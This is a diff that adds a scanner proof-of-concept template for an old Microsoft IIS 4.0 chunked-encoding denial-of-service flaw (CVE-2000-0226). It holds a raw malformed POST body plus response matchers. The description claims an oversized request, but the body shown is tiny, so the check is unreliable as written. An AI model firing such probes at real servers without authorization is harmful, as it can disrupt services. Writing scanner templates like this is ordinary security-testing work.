@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "向 IIS 4.0 发送超大的分块编码 POST 请求，触发内存耗尽导致拒绝服务。通过构造畸形的 chunked transfer encoding 数据包，使服务器在处理大缓冲区时发生缓冲区溢出。"
+id = "POC-AVE-2000-0202"
+name = "Microsoft IIS 4.0 分块传输编码缓冲区溢出拒绝服务漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-0202"]
+vuln_id = [
+    "CVE-2000-0226",
+    "AVE-2000-0202",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+1\r
+a\r
+0\r
+\r
+"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "500",
+    "Connection Reset",
+]
